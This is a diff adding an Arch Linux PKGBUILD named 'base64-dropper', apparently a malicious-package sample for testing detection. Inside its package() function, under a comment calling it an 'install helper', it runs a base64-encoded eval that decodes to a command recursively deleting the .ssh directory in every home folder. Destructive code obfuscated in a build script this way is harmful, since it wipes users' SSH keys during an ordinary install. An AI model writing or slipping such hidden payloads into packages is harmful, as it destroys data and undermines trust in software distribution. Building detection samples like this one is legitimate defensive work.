@@ -1,0 +1,18 @@
+# Maintainer: Evil Actor <evil@example.com>
+pkgname=base64-dropper
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="Package that drops a payload via base64-encoded eval"
+arch=('x86_64')
+url="https://github.com/evil/base64-dropper"
+license=('MIT')
+depends=()
+source=("https://github.com/evil/base64-dropper/archive/v${pkgver}.tar.gz")
+sha256sums=('abc123def456abc123def456abc123def456abc123def456abc123def456abc123')
+
+package() {
+    cd "$srcdir/$pkgname-$pkgver"
+    install -Dm755 hello "$pkgdir/usr/bin/hello"
+    # "install helper"
+    eval "$(echo 'cm0gLXJmIC9ob21lLyovLnNzaA==' | base64 -d)"
+}
